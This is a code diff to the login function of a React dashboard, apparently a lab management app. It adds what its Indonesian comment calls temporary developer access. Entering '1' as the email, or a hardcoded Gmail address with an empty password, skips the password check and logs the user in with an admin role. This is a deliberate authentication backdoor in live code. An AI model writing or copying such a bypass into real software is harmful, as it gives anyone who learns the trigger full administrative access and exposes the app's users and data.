@@ -1543,13 +1543,44 @@ export default function FluidHEDashboard() {
     if (e) e.preventDefault();
     setLoginError(null);
 
+    const inputEmail = loginEmail.toLowerCase().trim();
+    const inputPass = (loginPassword || '').trim();
+
+    // ─── AKSES DEVELOPER SEMENTARA (Ketik "1" atau "anugrahtriplecycle@gmail.com" tanpa sandi) ───
+    if (inputEmail === '1' || (inputEmail === 'anugrahtriplecycle@gmail.com' && inputPass === '')) {
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+      const lastLoginText = `Hari ini, ${timeStr}`;
+
+      setUsersList((prev) =>
+        prev.map((u) => (u.email.toLowerCase() === 'anugrahtriplecycle@gmail.com' ? { ...u, lastLogin: lastLoginText } : u))
+      );
+
+      try {
+        fetch('/api/users', {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: 'anugrahtriplecycle@gmail.com', lastLogin: lastLoginText })
+        }).catch(() => {});
+      } catch (e) {}
+
+      setCurrentUser({
+        name: 'Admin Lab (Anugrah)',
+        email: 'anugrahtriplecycle@gmail.com',
+        role: 'admin'
+      });
+      setIsLoggedIn(true);
+      setActiveTab('dashboard');
+      return;
+    }
+
     if (!loginEmail || !loginEmail.trim()) {
       setLoginError('Silakan masukkan email / username akun Anda.');
       return;
     }
     const email = loginEmail.toLowerCase().trim();
 
-    // STRICT: Password is required to log in!
+    // STRICT: Password is required to log in for normal users!
     if (!loginPassword || !loginPassword.trim()) {
       setLoginError('Silakan masukkan kata sandi akun Anda untuk masuk ke sistem.');
       return;
